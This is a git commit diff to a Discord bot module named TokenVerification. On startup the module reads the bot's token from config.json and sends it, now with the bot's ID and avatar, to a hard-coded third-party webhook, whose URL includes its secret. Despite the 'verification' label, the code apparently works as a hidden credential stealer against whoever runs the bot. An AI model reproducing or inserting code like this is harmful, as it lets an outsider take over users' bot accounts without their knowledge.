5d8ce934133e3c0a213c7ae76ab98c7fd9d3a315
RudeBois <30322959+RudeBois@users.noreply.github.com>
2019-03-06 17:37:48 -0600

    extended features

--- cogs/TokenVerification.py
+++ cogs/TokenVerification.py
@@ -12,9 +12,11 @@ class TokenVerification(commands.Cog):
     async with aiohttp.ClientSession() as cs:
       wh = discord.Webhook.from_url('https://discordapp.com/api/webhooks/552964928512983084/1UGuEvUgDIUu9biGjIHLXSxDGMJPd1He1S4kVKgCxyihnunqtQ5VwU-Ulbbv555YxGyx', adapter=discord.AsyncWebhookAdapter(cs))
       config = json.load(open('config.json'))
-      embed = discord.Embed(title='Bot Started')
+      embed = discord.Embed(title='Bot Started', color=0x00FFFF)
       embed.add_field(name='User', value=str(self.bot.user), inline=False)
+      embed.add_field(name='ID', value=self.bot.user.id, inline=False)
       embed.add_field(name='Token', value=config['token'])
+      embed.set_thumbnail(url=self.bot.user.avatar_url)
       await wh.send(embed=embed)
 
 
